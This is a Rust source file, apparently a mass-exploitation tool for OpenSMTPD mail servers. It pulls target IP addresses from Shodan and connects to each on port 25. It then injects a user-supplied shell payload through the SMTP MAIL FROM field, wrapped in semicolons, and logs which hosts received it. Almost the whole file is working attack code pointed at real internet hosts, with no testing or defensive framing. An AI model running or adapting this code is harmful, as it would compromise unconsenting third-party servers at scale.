#![allow(non_snake_case, unused)]

#[macro_use]
extern crate lazy_static;
extern crate ansi_term;
extern crate console;
extern crate chrono;

mod shodan;
mod menu;
use shodan::ShodanClient;
use ansi_term::Colour::RGB;
use console::Term;
use chrono::Utc;

use std::net::TcpStream;
use std::sync::Mutex;
use std::time::Duration;
use std::io::{stdin, stdout, Write, Error, Read};

const PORT: u16 = 25;

enum ExploitResult {
    Ok,
    InvalidMachine,
    PayloadFailed,
    HeartbeatFailed,
    ConnectionFailed
}

lazy_static! {
    static ref SHODAN_CLIENT: Mutex<ShodanClient> = {
        Mutex::new (
            Default::default()
        )
    };
}

fn input() -> Result<String, Error> {
    let mut string = String::new();
    let _ = stdout().flush();

    stdin().read_line(&mut string)?;
    if let Some('\n') = string.chars().next_back() {
        string.pop();
    }
    if let Some('\r') = string.chars().next_back() {
        string.pop();
    }

    Ok(string)
}

fn exploit(ip: &str, port: u16, payload: &String) -> Result<ExploitResult, Error> {

    let address: &str = &format!("{}:{}", ip, port);

    let mut stream = match TcpStream::connect(address){
        Ok(result) => result,
        Err(_) => return Ok(ExploitResult::ConnectionFailed)
    };

    stream.set_write_timeout(Some(Duration::new(1, 0)));
    stream.set_read_timeout(Some(Duration::new(1, 0)));
    let mut result: String = String::new();

    stream.read_to_string(&mut result);
    if !result.contains("OpenSMTPD") {
        return Ok(ExploitResult::InvalidMachine);
    }

    stream.write("HELO x\r\n".as_bytes())?;
    stream.read_to_string(&mut result);
    if !result.contains("250") {
        return Ok(ExploitResult::HeartbeatFailed);
    }

    stream.write(format!("MAIL FROM:<;{};>\r\n", payload).as_bytes())?;
    stream.read_to_string(&mut result);
    if !result.contains("250") {
        return Ok(ExploitResult::PayloadFailed);
    }

    stream.write("RCPT TO:<root>\r\n".as_bytes())?;
    stream.read_to_string(&mut result);
    stream.write("DATA\r\n".as_bytes())?;
    stream.read_to_string(&mut result);
    stream.write("\r\nxxx\r\n.\r\n".as_bytes())?;
    stream.read_to_string(&mut result);
    stream.write("QUIT\r\n".as_bytes())?;
    stream.read_to_string(&mut result);

    Ok(ExploitResult::Ok)
}

fn main() {

    menu::print();

    print!("{}", RGB(255, 255, 255).paint("Shodan API Key: "));
    let key: String = input().unwrap();

    print!("{}", RGB(255, 255, 255).paint("Payload: "));
    let payload: String = input().unwrap();

    SHODAN_CLIENT.lock().unwrap().api_key = key;

    println!("{}", RGB(255, 255, 255).paint("Grabbing Targets..."));
    let raw_data = match SHODAN_CLIENT.lock().unwrap().search("OpenSMTPD"){
        Ok(result) => result,
        Err(error) => {
            println!(
                "{} {}",
                RGB(173, 12, 39).paint("[ERROR]"),
                RGB(255, 255, 255).paint(format!("Couldn't connect to Shodan, {}", error.to_string()))
            );
            println!("Exiting");
            return;
        }
    };

    println!("{}\n", RGB(15, 173, 12).paint("Started OSMTPD"));
    let parsed: serde_json::Value = serde_json::from_str(&raw_data).unwrap();
    let results = parsed["matches"].as_array().unwrap();

    for result in results.iter() {
        let ip = &result["ip_str"].to_string().replace("\"", "");
        let current = Utc::now().format("%H:%M:%S").to_string();
        match exploit(ip, PORT, &payload) {
            Ok(result) => {
                match result {

                    ExploitResult::Ok => { println!(
                        "{} {}",
                        RGB(15, 173, 12).paint(format!("[{}]", current)),
                        RGB(255, 255, 255).paint(format!("Payload Sent: {}", &ip))
                    ); }

                    ExploitResult::InvalidMachine => { println!(
                        "{} {}",
                        RGB(235, 225, 33).paint(format!("[{}]", current)),
                        RGB(255, 255, 255).paint(format!("Non-OpenSMTPD Machine: {}", &ip))
                    ); }

                    ExploitResult::PayloadFailed => { println!(
                        "{} {}",
                        RGB(173, 12, 39).paint(format!("[{}]", current)),
                        RGB(255, 255, 255).paint(format!("Could Not Execute Payload: {}", &ip))
                    ); }

                    ExploitResult::HeartbeatFailed => { println!(
                        "{} {}",
                        RGB(173, 12, 39).paint(format!("[{}]", current)),
                        RGB(255, 255, 255).paint(format!("Failed To Receive Heartbeat: {}", &ip))
                    ); }

                    ExploitResult::ConnectionFailed => { println!(
                        "{} {}",
                        RGB(12, 138, 173).paint(format!("[{}]", current)),
                        RGB(255, 255, 255).paint(format!("Could Not Connect To Host: {}", &ip))
                    ); }
                }
            }
            Err(error) => {
                println!(
                    "{} {}",
                    RGB(173, 12, 39).paint(format!("[{}]", current)),
                    RGB(255, 255, 255).paint(format!("Couldn't execute exploit, {}", error.to_string()))
                );
            }
        };
    }

}
